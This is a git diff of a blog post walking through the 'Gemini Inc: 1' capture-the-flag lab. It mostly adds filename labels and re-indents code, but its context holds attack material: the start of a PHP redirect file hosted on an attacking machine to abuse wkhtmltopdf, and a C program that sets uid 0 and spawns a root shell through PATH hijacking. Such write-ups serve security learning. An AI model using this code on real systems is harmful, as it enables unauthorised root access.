@@ -1,7 +1,7 @@
 ---
 layout: post
 date: 2018-05-20 17:53:34 +0000
-last_modified_at: 2018-08-03 17:50:17 +0000
+last_modified_at: 2018-08-03 19:04:20 +0000
 title: "Gemini Inc: 1 Walkthrough"
 subtitle: "Good Things Come in Pairs"
 category: Walkthrough
@@ -104,6 +104,7 @@ It goes like this—`wkhtmltopdf` follows 302 redirection, captures the HTML, an
 
 All we've to do is to host the following code as `1.php` in our attacking machine.
 
+<div class="filename"><span>1.php</span></div>
 ```php
 <?php
      $file = $_GET['f'];
@@ -163,15 +164,16 @@ Now, notice that `date` has no full path? If we change the search path `$PATH` a
 
 The following C code `date.c` allows us to `setuid` and `setgid` as `root`, and spawn a shell.
 
+<div class="filename"><span>date.c</span></div>
 ```c
 #include <sys/types.h>
 #include <unistd.h>
 #include <stdlib.h>
 
 int main() {
-	setuid(0);
-	setgid(0);
-	system("/bin/bash");
+  setuid(0);
+  setgid(0);
+  system("/bin/bash");
 }
 ```
 
